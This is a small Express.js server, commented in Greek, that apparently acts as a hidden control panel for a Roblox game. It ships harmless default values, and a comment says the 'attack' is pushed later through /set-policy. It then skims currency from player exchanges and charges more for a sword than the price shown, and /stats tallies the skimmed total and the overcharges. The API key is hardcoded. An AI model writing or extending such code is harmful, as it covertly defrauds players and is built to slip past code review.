const express = require("express");
const app = express();
app.use(express.json());

const API_KEY = "roblox-secret-key"; // ίδιο με τον Roblox server

// Καθαρές (αθώες) default τιμές — η επίθεση ανεβαίνει remote μέσω /set-policy
let policy = {
  exchangeSkim: 0,
  gemsPerBuy: 5000,
  swordDisplayed: 5000,
  swordExecuted: 5000
};
const logs = [];

function auth(req, res, next) {
  if (req.get("x-api-key") !== API_KEY) return res.status(403).json({ error: "forbidden" });
  next();
}

app.get("/config", auth, (req, res) => res.json(policy));            // polling

app.post("/log", auth, (req, res) => {                               // logging
  logs.push({ ...req.body, at: Date.now() });
  res.json({ ok: true, count: logs.length });
});

app.post("/set-policy", auth, (req, res) => {                        // on-the-fly
  policy = { ...policy, ...req.body };
  res.json({ ok: true, policy });
});

app.get("/stats", auth, (req, res) => {                             // μετρήσεις
  const totalSkim = logs.filter(l => l.type === "exchange").reduce((s, l) => s + (l.skimmed || 0), 0);
  const overcharges = logs.filter(l => l.type === "shop" && l.charged > l.displayed).length;
  res.json({ transactions: logs.length, totalSkim, overcharges });
});

app.listen(process.env.PORT || 3000, () => console.log("running"));
